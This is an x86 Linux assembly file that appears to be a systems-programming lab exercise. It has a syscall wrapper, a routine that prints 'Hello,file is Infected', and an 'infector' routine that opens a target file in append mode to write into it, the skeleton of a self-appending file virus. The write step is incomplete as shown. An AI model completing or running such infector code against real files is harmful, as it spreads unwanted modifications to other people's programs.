;;
section .rodata
    TheInfectedMessage: db " Hello,file is Infected ", 10
    LengthOfInfectedMessage: equ $ - TheInfectedMessage

section .text
global _start
global system_call
global infection
global infector
extern main

StartingOurCode:
infection:  
    mov eax, 0x4                        
    xor ebx, ebx
    add ebx, 1
    mov ecx, TheInfectedMessage            
    mov edx, LengthOfInfectedMessage        
    int 0x80
    ret

;;
_start:
    pop    dword ecx    ; ecx = argc
    mov    esi,esp      ; esi = argv
    ;; lea eax, [esi+4*ecx+4] ; eax = envp = (4*ecx)+esi+4
    mov     eax,ecx     ; put the number of arguments into eax
    shl     eax,2       ; compute the size of argv in bytes
    add     eax,esi     ; add the size to the address of argv 
    add     eax,4       ; skip NULL at the end of argv
    push    dword eax   ; char *envp[]
    push    dword esi   ; char* argv[]
    push    dword ecx   ; int argc

    call    main        ; int main( int argc, char *argv[], char *envp[] )

    mov     ebx,eax
    mov     eax,1
    int     0x80
    nop
        
system_call:
    push    ebp             ; Save caller state
    mov     ebp, esp
    sub     esp, 4          ; Leave space for local var on stack
    pushad                  ; Save some more caller state

    mov     eax, [ebp+8]    ; Copy function args to registers: leftmost...        
    mov     ebx, [ebp+12]   ; Next argument...
    mov     ecx, [ebp+16]   ; Next argument...
    mov     edx, [ebp+20]   ; Next argument...
    int     0x80            ; Transfer control to operating system
    mov     [ebp-4], eax    ; Save returned value...
    popad                   ; Restore caller state (registers)
    mov     eax, [ebp-4]    ; place returned value where caller can see it
    add     esp, 4          ; Restore caller state
    pop     ebp             ; Restore caller state
    ret                     ; Back to caller
;;

infector:
    open_file:
        xor eax, eax
        add eax, 5                    
        mov ebx, [esp+4]                
        mov ecx, 2001o                  
        int 0x80
        mov edi, eax
    write_virus:
        xor eax, eax
        add eax, 4                    
        mov ebx, edi                   
        int 0x80

    close_file:
        xor eax, eax
        add eax, 6
        mov ebx, edi
        int 0x80
        ret